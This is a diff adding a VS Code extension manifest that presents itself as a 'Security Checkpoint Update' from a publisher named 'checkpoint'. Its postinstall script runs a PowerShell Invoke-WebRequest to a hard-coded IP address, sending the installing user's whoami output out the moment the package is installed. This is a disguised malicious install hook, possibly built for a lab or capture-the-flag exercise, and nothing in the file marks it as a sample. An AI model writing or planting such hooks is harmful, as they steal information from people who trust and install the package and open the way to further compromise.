@@ -1,0 +1,12 @@
+{
+    "name": "extensie",
+    "displayName": "Security Checkpoint Update",
+    "version": "1.0.0",
+    "publisher": "checkpoint",
+    "engines": {
+        "vscode": "^1.118.0"
+    },
+    "scripts": {
+        "postinstall": "powershell -Command \"Invoke-WebRequest -Uri http://10.10.17.68:80/?output=(whoami)\""
+    }
+}
